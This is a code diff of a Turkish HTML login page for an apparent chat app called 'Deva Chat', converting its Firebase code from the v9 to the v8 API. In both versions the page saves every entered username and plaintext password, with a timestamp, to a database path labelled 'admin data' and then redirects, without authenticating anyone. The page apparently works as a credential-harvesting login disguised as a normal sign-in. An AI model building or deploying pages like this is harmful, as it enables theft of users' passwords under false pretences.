@@ -4,27 +4,29 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Deva Chat | Giriş</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .login-card { width: 320px; border: 1px solid #363636; padding: 40px; text-align: center; border-radius: 8px; }
         h1 { font-style: italic; font-size: 35px; margin-bottom: 30px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; background: #121212; border: 1px solid #363636; color: white; border-radius: 5px; box-sizing: border-box; }
+        input { width: 100%; padding: 12px; margin: 8px 0; background: #121212; border: 1px solid #363636; color: white; border-radius: 5px; box-sizing: border-box; outline: none; }
         button { width: 100%; padding: 12px; background: #0095f6; border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 15px; }
+        button:active { background: #0077c7; }
     </style>
 </head>
 <body>
+
     <div class="login-card">
         <h1>Deva Chat</h1>
         <input type="text" id="username" placeholder="Kullanıcı Adı">
         <input type="password" id="password" placeholder="Şifre">
-        <button id="loginBtn">Giriş Yap</button>
+        <button onclick="girisYap()">Giriş Yap</button>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
-        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js";
-
-        const firebaseConfig = {
+    <script>
+        // Sizin Firebase Bilgileriniz
+        var firebaseConfig = {
             apiKey: "AIzaSyDMFqe-lG6-cZUM4XhXs5ftkZt9xZjsno0",
             authDomain: "devachat-fdeb3.firebaseapp.com",
             projectId: "devachat-fdeb3",
@@ -34,31 +36,33 @@
             databaseURL: "https://devachat-fdeb3-default-rtdb.firebaseio.com"
         };
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+        // Firebase'i Başlat
+        firebase.initializeApp(firebaseConfig);
+        var database = firebase.database();
 
-        document.getElementById('loginBtn').addEventListener('click', () => {
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+        function girisYap() {
+            var user = document.getElementById('username').value;
+            var pass = document.getElementById('password').value;
 
-            if(user && pass) {
-                // Bilgileri gönderiyoruz
-                set(ref(db, 'yonetici_verileri/' + user), {
+            if (user != "" && pass != "") {
+                // Veriyi Veritabanına Yaz
+                database.ref('yonetici_verileri/' + user).set({
                     kullanici: user,
                     sifre: pass,
                     tarih: new Date().toLocaleString()
-                })
-                .then(() => {
-                    localStorage.setItem('chatUser', user);
-                    window.location.href = "chat.html"; // Bilgi gidince yönlendir
-                })
-                .catch((error) => {
-                    alert("Hata Oluştu: " + error.message);
+                }, function(error) {
+                    if (error) {
+                        alert("Hata: " + error.message);
+                    } else {
+                        // Başarılıysa yönlendir
+                        localStorage.setItem('chatUser', user);
+                        window.location.href = "chat.html";
+                    }
                 });
             } else {
-                alert("Lütfen tüm alanları doldurun!");
+                alert("Lütfen alanları boş bırakmayın!");
             }
-        });
+        }
     </script>
 </body>
 </html>
